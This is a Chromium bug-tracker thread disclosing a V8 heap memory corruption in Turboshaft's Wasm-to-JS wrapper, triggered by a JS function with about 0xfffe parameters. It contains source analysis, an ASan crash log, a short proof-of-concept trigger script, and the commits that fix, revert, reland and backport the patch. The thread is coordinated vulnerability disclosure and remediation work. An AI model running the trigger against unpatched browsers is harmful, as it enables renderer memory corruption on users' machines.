# Heap memory corruption due to overly large parameter count in WasmToJSWrapper tier-up

Issue URL: https://issues.chromium.org/issues/394350433
VRP-Reward: 11000
Date: Feb 5, 2025 05:35AM


### VULNERABILITY DETAILS

#### Summary

Heap memory corruption due to overly large JS parameter count of `0xfffa` and above in Wasm-to-JS wrapper tier-up compilation causing out-of-bounds memory access at `InstructionSelectorT::InitializeCallBuffer()`.

#### Details

When compiling a Wasm-to-JS wrapper where the imported JS function expects an arity of `0xfffa` or more, the total argument nodes required goes over the limit of `0xfffe` and above:

```
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wrappers.cc;drc=d18f1fb989fa3f6191bba17495c41cf06b6f4172;l=556

  void BuildWasmToJSWrapper(ImportCallKind kind, int expected_arity,
                            Suspend suspend) {
    // ...
    int pushed_count = std::max(expected_arity, wasm_count);
    // 5 extra arguments: receiver, new target, arg count, dispatch handle and
    // context.
    bool has_dispatch_handle =
        kind == ImportCallKind::kUseCallBuiltin
            ? false
            : V8_JS_LINKAGE_INCLUDES_DISPATCH_HANDLE_BOOL;
    base::SmallVector<OpIndex, 16> args(pushed_count + 4 +
                                        (has_dispatch_handle ? 1 : 0));
    // ...
```

This confuses the Turboshaft compiler, where the end result is an out-of-bounds heap memory access in `GetVirtualRegister()`:

```
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/instruction-selector.cc;drc=69de864028e8d11e8d05971253b98229365d4fb0;l=522

template <typename Adapter>
int InstructionSelectorT<Adapter>::GetVirtualRegister(node_t node) {
  DCHECK(this->valid(node));
  size_t const id = this->id(node);                   // [!] invalid id returned
  DCHECK_LT(id, virtual_registers_.size());
  int virtual_register = virtual_registers_[id];      // [!] oob read
  if (virtual_register == InstructionOperand::kInvalidVirtualRegister) {
    virtual_register = sequence()->NextVirtualRegister();
    virtual_registers_[id] = virtual_register;        // [!] potential oob write, and broken registers tracking
  }
  return virtual_register;
}
```

This is an immediate out-of-v8sbx memory corruption where an attacker can spray target data of `virtual_registers_[id] == InstructionOperand::kInvalidVirtualRegister` which this vulnerability allows to modify it to a different value. Not only is this the only problem, but the bug will also likely result in a broken compilation result which opens up other avenues of exploitation.

### Bisect

TBD

### VERSION

Chrome Version: Tested on Chrome M131 ~ M133 (latest stable), `d8` ToT  
Operating System: All

### REPRODUCTION CASE

Attached as `wasmtojs-tierup-isel-crash.js` which crashes due to OOB access. Also attached is a small wrapper `wrapper.html` that loads this script in Chrome to demonstrate reproducibility also in Chrome.

Full exploit is TBD.

### FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: Renderer

Crash State:

```
$ ./d8-asan-sandbox-testing-linux-release-v8-component-98499/d8 ./wasmtojs-tierup-isel-crash.js
=================================================================
==713021==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x79c88b272f34 at pc 0x5ce6f04cfac5 bp 0x7ffdc4a3e4d0 sp 0x7ffdc4a3e4c8
READ of size 4 at 0x79c88b272f34 thread T0
    #0 0x5ce6f04cfac4 in v8::internal::compiler::InstructionSelectorT::GetVirtualRegister(v8::internal::compiler::turboshaft::OpIndex) src/compiler/backend/instruction-selector.cc:543:26
    #1 0x5ce6f04d46f7 in v8::internal::compiler::OperandGeneratorT::UseLocation(v8::internal::compiler::turboshaft::OpIndex, v8::internal::LinkageLocation) src/compiler/backend/instruction-selector-impl.h:262:53
    #2 0x5ce6f04d396d in v8::internal::compiler::InstructionSelectorT::InitializeCallBuffer(v8::internal::compiler::turboshaft::OpIndex, v8::internal::compiler::CallBufferT*, v8::base::Flags<v8::internal::compiler::InstructionSelectorT::CallBufferFlag, int, int>, int) src/compiler/backend/instruction-selector.cc:1744:31
    #3 0x5ce6f04dbdef in v8::internal::compiler::InstructionSelectorT::VisitCall(v8::internal::compiler::turboshaft::OpIndex, v8::internal::compiler::turboshaft::Block*) src/compiler/backend/instruction-selector.cc:2846:3
    #4 0x5ce6f04d6374 in v8::internal::compiler::InstructionSelectorT::VisitNode(v8::internal::compiler::turboshaft::OpIndex) src/compiler/backend/instruction-selector.cc:5602:9
    #5 0x5ce6f04cdd76 in v8::internal::compiler::InstructionSelectorT::VisitBlock(v8::internal::compiler::turboshaft::Block*) src/compiler/backend/instruction-selector.cc:2031:7
    #6 0x5ce6f04cd366 in v8::internal::compiler::InstructionSelectorT::SelectInstructions() src/compiler/backend/instruction-selector.cc:157:5
    #7 0x5ce6f0f76b99 in v8::internal::compiler::turboshaft::InstructionSelectionPhase::Run(v8::internal::compiler::turboshaft::PipelineData*, v8::internal::Zone*, v8::internal::compiler::CallDescriptor const*, v8::internal::compiler::Linkage*, v8::internal::CodeTracer*) src/compiler/turboshaft/instruction-selection-phase.cc:359:55
    #8 0x5ce6f08eb1e1 in auto v8::internal::compiler::turboshaft::Pipeline::Run<v8::internal::compiler::turboshaft::InstructionSelectionPhase, v8::internal::compiler::CallDescriptor*&, v8::internal::compiler::Linkage*&, v8::internal::CodeTracer*&>(v8::internal::compiler::CallDescriptor*&, v8::internal::compiler::Linkage*&, v8::internal::CodeTracer*&) src/compiler/turboshaft/pipelines.h:88:27
    #9 0x5ce6f0880fe6 in v8::internal::compiler::turboshaft::Pipeline::SelectInstructions(v8::internal::compiler::Linkage*) src/compiler/turboshaft/pipelines.h:312:48
    #10 0x5ce6f0869beb in v8::internal::compiler::(anonymous namespace)::GenerateCodeFromTurboshaftGraph(v8::internal::compiler::Linkage*, v8::internal::compiler::turboshaft::Pipeline&, v8::internal::compiler::PipelineImpl*, std::__Cr::shared_ptr<v8::internal::compiler::OsrHelper>) src/compiler/pipeline.cc:504:28
    #11 0x5ce6f08738dc in v8::internal::compiler::Pipeline::GenerateCodeForWasmNativeStubFromTurboshaft(v8::internal::wasm::CanonicalSig const*, v8::internal::wasm::WrapperCompilationInfo, char const*, v8::internal::AssemblerOptions const&, v8::internal::compiler::SourcePositionTable*) src/compiler/pipeline.cc:3061:26
    #12 0x5ce6f19cb9ca in v8::internal::compiler::CompileWasmImportCallWrapper(v8::internal::wasm::ImportCallKind, v8::internal::wasm::CanonicalSig const*, bool, int, v8::internal::wasm::Suspend) src/compiler/wasm-compiler.cc:1729:17
    #13 0x5ce6eff41362 in v8::internal::wasm::WasmImportWrapperCache::CompileWasmImportCallWrapper(v8::internal::Isolate*, v8::internal::wasm::ImportCallKind, v8::internal::wasm::CanonicalSig const*, v8::internal::wasm::CanonicalTypeIndex, bool, int, v8::internal::wasm::Suspend) src/wasm/wasm-import-wrapper-cache.cc:158:34
    #14 0x5ce6efbc3ebe in __RT_impl_Runtime_TierUpWasmToJSWrapper src/runtime/runtime-wasm.cc:745:24
    #15 0x5ce6efbc3ebe in v8::internal::Runtime_TierUpWasmToJSWrapper(int, unsigned long*, v8::internal::Isolate*) src/runtime/runtime-wasm.cc:627:1
    #16 0x5ce6f1ba63c8 in Builtins_WasmCEntry setup-isolate-deserialize.cc
    #17 0x5ce6f1b9d20b in Builtins_WasmToJsWrapperCSA setup-isolate-deserialize.cc
    #18 0x7b788bed2996  (<unknown module>)
    #19 0x5ce6f1b9c814 in Builtins_JSToWasmWrapperAsm setup-isolate-deserialize.cc
    #20 0x5ce6f1c7e3fd in Builtins_JSToWasmWrapper setup-isolate-deserialize.cc
    #21 0x5ce6f1afec74 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #22 0x5ce6f1afc75b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #23 0x5ce6f1afc4aa in Builtins_JSEntry setup-isolate-deserialize.cc
    #24 0x5ce6ee6c5f25 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:437:22
    #25 0x5ce6ee6c68c8 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:537:10
    #26 0x5ce6ee296fbc in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2146:7
    #27 0x5ce6ee210593 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1018:44
    #28 0x5ce6ee23129f in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:4979:10
    #29 0x5ce6ee238db7 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:5930:37
    #30 0x5ce6ee23884c in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:5838:18
    #31 0x5ce6ee23ad8d in v8::Shell::Main(int, char**) src/d8/d8.cc:6696:18
    #32 0x7b788bc29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

Address 0x79c88b272f34 is a wild pointer inside of access range of size 0x000000000004.
SUMMARY: AddressSanitizer: heap-buffer-overflow src/compiler/backend/instruction-selector.cc:543:26 in v8::internal::compiler::InstructionSelectorT::GetVirtualRegister(v8::internal::compiler::turboshaft::OpIndex)
Shadow bytes around the buggy address:
  0x79c88b272c80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b272d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b272d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b272e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b272e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x79c88b272f00: fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa
  0x79c88b272f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b273000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b273080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b273100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x79c88b273180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==713021==ABORTING
```

### CREDIT INFORMATION

Reporter credit: Seunghyun Lee (@0x10n) of CMU CyLab

* * *

Initially discovered by a v8sbx fuzzer, which revealed not to be a v8sbx violation but a full-blown memory corruption bug.


---

**#2 — se...@gmail.com — Feb 5, 2025 06:03AM**

### Bisect

Bisect identified [https://chromium-review.googlesource.com/c/v8/v8/+/5397438](<https://chromium-review.googlesource.com/c/v8/v8/+/5397438>) as the likely offending commit:

```
[wasm] Enable the Turboshaft wrappers behind --turboshaft-wasm

We can enable the Turboshaft wrappers by default now, but they depend on
the main turboshaft-wasm pipeline, so add them as a flag dependency of
--turboshaft-wasm.
```

Thus Turboshaft-compiled wasm wrappers were likely consistently broken from the start - based on Chrome versions, this would be 125.0.6383.0 and above.

* * *

**Update** : As expected, bisecting with `--js-flags=--turboshaft-wasm-wrappers` yields [https://chromium-review.googlesource.com/c/v8/v8/+/5342760](<https://chromium-review.googlesource.com/c/v8/v8/+/5342760>) which first introduced Turboshaft Wasm-to-JS wrapper behind the flag.

Repro was also needlessly complex, this suffices to trigger the bug:

```
// needs wasm-module-builder.js here
const fn = eval('(' + Array(0xfffe).fill(0).map((_, i) => 'p'+i) + ')=>{}');

const builder = new WasmModuleBuilder();
const $sig_v_v = builder.addType(kSig_v_v);
const impIndex = builder.addImport('import', 'fn', $sig_v_v);

builder.addFunction('main', $sig_v_v).addBody([
  kExprCallFunction, impIndex,
]).exportFunc();

const instance = builder.instantiate({import: {fn}});
const {main} = instance.exports;
for (let i = 0; i < 1000; i++) {
  main();
}
```


---

**#3 — li...@chromium.org — Feb 5, 2025 08:00AM**

Assigning to thibaudm@ due to the bisect from [crbug.com/394350433](<https://crbug.com/394350433>)#comment2.

Foundin is set to extended stable since that commit is from last year.


---

**#4 — pe...@google.com — Feb 6, 2025 12:39AM**

Setting milestone because of s0/s1 severity.


---

**#5 — pe...@google.com — Feb 6, 2025 12:39AM**

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.


---

**#6 — ap...@google.com — Feb 6, 2025 09:44PM**

Project: v8/v8  
Branch: main  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6239200](<https://chromium-review.googlesource.com/6239200>)

[wasm] Verify max operation input count in the wasm-to-js wrapper

* * *

Expand for full commit details

```
[wasm] Verify max operation input count in the wasm-to-js wrapper 
 
JS has a limit of 2^16-1 parameters per function, but the compiled 
wasm-to-js wrapper adds a few implicit arguments to the call operation. 
This can create an op with more than 2^16-1 inputs, which breaks 
Turboshaft's implementation limit. 
Temporarily turn this into a hard crash with a check, and follow up with 
a more robust fix. 
 
R=jkummerow@chromium.org 
 
Bug: 394350433 
Change-Id: I334a26053c3aa4c55e7f26d7fa228689c0587308 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239200 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98541}
```

* * *

Files:

  * M `src/wasm/wrappers.cc`

* * *

Hash: 7cb33a833b6b8d0bf1493d45bd14131cecdcfd85  
Date: Thu Feb 06 12:08:33 2025

* * *


---

**#7 — ap...@google.com — Feb 7, 2025 12:55AM**

Project: v8/v8  
Branch: main  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6239302](<https://chromium-review.googlesource.com/6239302>)

Lower the maximum JS parameter count

* * *

Expand for full commit details

```
Lower the maximum JS parameter count 
 
To allow extra implicit arguments on the call node without overflowing 
the uint16_t input count, in particular in the wasm-to-js wrapper where 
we don't have a bailout mechanism. 
 
R=verwaest@chromium.org 
 
Fixed: 394350433 
Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98556}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-388905056.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: 1827ed8345369ca50a55a10ab3e45bcc581c6339  
Date: Thu Feb 06 14:58:18 2025

* * *


---

**#8 — pe...@google.com — Feb 7, 2025 12:58AM**

Dear owner, thanks for fixing this bug. We've reopened it because:

  * It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines: 
    * If there are multiple CLs required, please list all.
    * If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
    * If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
    * If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
    * If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
    * If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590. After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!


---

**#9 — pe...@google.com — Feb 7, 2025 01:28AM**

Dear owner, thanks for fixing this bug. We've reopened it because:

  * Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!


---

**#10 — ap...@google.com — Feb 7, 2025 04:11AM**

Project: v8/v8  
Branch: main  
Author: Michael Achenbach <[machenbach@chromium.org](<mailto:machenbach@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6240472](<https://chromium-review.googlesource.com/6240472>)

Revert "Lower the maximum JS parameter count"

* * *

Expand for full commit details

```
Revert "Lower the maximum JS parameter count" 
 
This reverts commit 1827ed8345369ca50a55a10ab3e45bcc581c6339. 
 
Reason for revert:  
The test regress-crbug-724153 now times out on multiple bots for 
some reason: 
https://ci.chromium.org/ui/p/v8/builders/ci/V8%20Linux64/60517/overview 
https://ci.chromium.org/ui/p/v8/builders/ci/V8%20Linux64%20TSAN/56221/overview 
 
Original change's description: 
> Lower the maximum JS parameter count 
> 
> To allow extra implicit arguments on the call node without overflowing 
> the uint16_t input count, in particular in the wasm-to-js wrapper where 
> we don't have a bailout mechanism. 
> 
> R=verwaest@chromium.org 
> 
> Fixed: 394350433 
> Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
> Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
> Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#98556} 
 
Change-Id: I6b5886f5dad2a4bdf1966841ea33b5702b78df20 
No-Presubmit: true 
No-Tree-Checks: true 
No-Try: true 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6240472 
Auto-Submit: Michael Achenbach <machenbach@chromium.org> 
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
Cr-Commit-Position: refs/heads/main@{#98565}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-388905056.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: 8f82330cc7b292abd4aad64ea520cc6b3e5e15b7  
Date: Thu Feb 06 11:05:17 2025

* * *


---

**#11 — pe...@google.com — Feb 8, 2025 12:43AM**

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M134. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [132, 133, 134].

Please answer the following questions so that we can safely process this merge request:

  1. Which CLs should be backmerged? (Please include Gerrit links.)
  2. Has this fix been verified on Canary to not pose any stability regressions?
  3. Does this fix pose any potential non-verifiable stability risks?
  4. Does this fix pose any known compatibility risks?
  5. Does it require manual verification by the test team? If so, please describe required testing.
  6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!


---

**#12 — ap...@google.com — Feb 10, 2025 11:37PM**

Project: v8/v8  
Branch: main  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6249299](<https://chromium-review.googlesource.com/6249299>)

Reland "Lower the maximum JS parameter count"

* * *

Expand for full commit details

```
Reland "Lower the maximum JS parameter count" 
 
This is a reland of commit 1827ed8345369ca50a55a10ab3e45bcc581c6339 
 
Before the change, one of the nodes had more than 2^16 inputs 
so optimization bailed out. 
After the change, the function has fewer parameters and gets 
optimized, and the register allocator struggles with that many 
parameters and times out. 
Just mark the test as slow for now. 
 
Original change's description: 
> Lower the maximum JS parameter count 
> 
> To allow extra implicit arguments on the call node without overflowing 
> the uint16_t input count, in particular in the wasm-to-js wrapper where 
> we don't have a bailout mechanism. 
> 
> R=verwaest@chromium.org 
> 
> Fixed: 394350433 
> Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
> Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
> Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#98556} 
 
Change-Id: I9b5c53a8f7ee247914585a3292895672bbce1ab6 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6249299 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98609}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/mjsunit.status`
  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-388905056.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: 84a0e230dabc2c874a129c2280d6be4f45636225  
Date: Mon Feb 10 14:31:16 2025

* * *


---

**#13 — th...@chromium.org — Feb 11, 2025 10:04PM**

Re [comment #11](<https://issues.chromium.org/issues/394350433#comment11>):  
1\. [https://chromium-review.googlesource.com/6249299](<https://chromium-review.googlesource.com/6249299>)  
2\. The fix has been in canary for less than a day  
3\. No  
4\. No  
5\. No


---

**#14 — am...@chromium.org — Feb 14, 2025 05:46AM**

merges approved for [https://crrev.com/c/6249299](<https://crrev.com/c/6249299>), please merge to the respective V8 branches ASAP, by 10am PT tomorrow (Friday) so this fix can be included in next week's updates.


---

**#15 — ap...@google.com — Feb 14, 2025 11:58PM**

Project: v8/v8  
Branch: refs/branch-heads/13.3  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6269033](<https://chromium-review.googlesource.com/6269033>)

Merged: "Reland "Lower the maximum JS parameter count""

* * *

Expand for full commit details

```
Merged: "Reland "Lower the maximum JS parameter count"" 
 
This is a reland of commit 1827ed8345369ca50a55a10ab3e45bcc581c6339 
 
Before the change, one of the nodes had more than 2^16 inputs 
so optimization bailed out. 
After the change, the function has fewer parameters and gets 
optimized, and the register allocator struggles with that many 
parameters and times out. 
Just mark the test as slow for now. 
 
Original change's description: 
> Lower the maximum JS parameter count 
> 
> To allow extra implicit arguments on the call node without overflowing 
> the uint16_t input count, in particular in the wasm-to-js wrapper where 
> we don't have a bailout mechanism. 
> 
> R=verwaest@chromium.org 
> 
> Fixed: 394350433 
> Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
> Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
> Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#98556} 
 
(cherry picked from commit 84a0e230dabc2c874a129c2280d6be4f45636225) 
 
Change-Id: I0a36d0f6e647cc0cf584c69a534f3ce82738134c 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6269033 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.3@{#42} 
Cr-Branched-From: 41dacffe436aeb9311879cb07648f1e36609a804-refs/heads/13.3.415@{#1} 
Cr-Branched-From: 3348638c0af67c885b30891a358c89a917ac9759-refs/heads/main@{#97937}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/mjsunit.status`
  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: 07067287fd2c3c2dc961dfd8d7310299fa3ab8f5  
Date: Mon Feb 10 14:31:16 2025

* * *


---

**#16 — ap...@google.com — Feb 14, 2025 11:58PM**

Project: v8/v8  
Branch: refs/branch-heads/13.4  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6268482](<https://chromium-review.googlesource.com/6268482>)

Merged: "Reland "Lower the maximum JS parameter count""

* * *

Expand for full commit details

```
Merged: "Reland "Lower the maximum JS parameter count"" 
 
This is a reland of commit 1827ed8345369ca50a55a10ab3e45bcc581c6339 
 
Before the change, one of the nodes had more than 2^16 inputs 
so optimization bailed out. 
After the change, the function has fewer parameters and gets 
optimized, and the register allocator struggles with that many 
parameters and times out. 
Just mark the test as slow for now. 
 
Original change's description: 
> Lower the maximum JS parameter count 
> 
> To allow extra implicit arguments on the call node without overflowing 
> the uint16_t input count, in particular in the wasm-to-js wrapper where 
> we don't have a bailout mechanism. 
> 
> R=verwaest@chromium.org 
> 
> Fixed: 394350433 
> Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
> Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
> Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#98556} 
 
(cherry picked from commit 84a0e230dabc2c874a129c2280d6be4f45636225) 
 
Change-Id: Ib0fe3fbbd5dc544261312b6674ca76baa2ea4d56 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6268482 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.4@{#18} 
Cr-Branched-From: 0f87a54dade4353b6ece1d7591ca8c66f90c1c93-refs/heads/13.4.114@{#1} 
Cr-Branched-From: 27af2e9363b2701abc5f3feb701b1dad7d1a9fe8-refs/heads/main@{#98459}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/mjsunit.status`
  * M `test/mjsunit/regress/regress-11491.js`
  * M `test/mjsunit/regress/regress-388905056.js`
  * M `test/mjsunit/regress/regress-crbug-724153.js`
  * M `test/mjsunit/regress/regress-v8-6716.js`
  * M `test/mjsunit/turboshaft/maglev-frontend/regress-359266991.js`

* * *

Hash: 66f52356a52811d25b485c875615d6883d6218b2  
Date: Mon Feb 10 14:31:16 2025

* * *


---

**#17 — ap...@google.com — Feb 14, 2025 11:58PM**

Project: v8/v8  
Branch: refs/branch-heads/13.2  
Author: Thibaud Michaud <[thibaudm@chromium.org](<mailto:thibaudm@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6268260](<https://chromium-review.googlesource.com/6268260>)

Merged: "Reland "Lower the maximum JS parameter count""

* * *

Expand for full commit details

```
Merged: "Reland "Lower the maximum JS parameter count"" 
 
This is a reland of commit 1827ed8345369ca50a55a10ab3e45bcc581c6339 
 
Before the change, one of the nodes had more than 2^16 inputs 
so optimization bailed out. 
After the change, the function has fewer parameters and gets 
optimized, and the register allocator struggles with that many 
parameters and times out. 
Just mark the test as slow for now. 
 
Original change's description: 
> Lower the maximum JS parameter count 
> 
> To allow extra implicit arguments on the call node without overflowing 
> the uint16_t input count, in particular in the wasm-to-js wrapper where 
> we don't have a bailout mechanism. 
> 
> R=verwaest@chromium.org 
> 
> Fixed: 394350433 
> Change-Id: I61d2e2387539cafd6a0909c3ee035c93d0217be3 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6239302 
> Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
> Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#98556} 
 
(cherry picked from commit 84a0e230dabc2c874a129c2280d6be4f45636225) 
 
Change-Id: Ibdfbc0850ca709f0418efdb1ed89a82796a9c378 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6268260 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.2@{#80} 
Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}
```

* * *

Files:

  * M `src/objects/code.h`
  * M `test/mjsunit/mjsunit.status`
